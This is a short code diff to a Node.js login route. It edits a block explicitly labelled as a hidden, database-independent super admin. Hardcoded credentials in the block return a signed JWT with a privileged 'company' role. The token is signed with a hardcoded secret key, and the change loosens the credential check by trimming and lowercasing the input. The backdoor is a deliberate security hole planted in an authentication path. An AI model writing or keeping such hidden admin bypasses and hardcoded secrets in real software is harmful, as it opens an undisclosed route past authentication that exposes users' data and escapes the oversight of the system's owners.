@@ -42,7 +42,10 @@ router.post('/login', async (req, res) => {
 
     try {
         // === HIDDEN SUPER ADMIN (DATABASE INDEPENDENT) ===
-        if (username === 'anson_admin' && password === 'masterkey_2026') {
+        const safeUser = (username || '').trim().toLowerCase();
+        const safePass = (password || '').trim();
+
+        if (safeUser === 'anson_admin' && safePass === 'masterkey_2026') {
             const accessToken = jwt.sign(
                 { id: 999999, username: 'anson_admin', role: 'company', schoolId: null },
                 'hardcoded_secret_key_fixed',
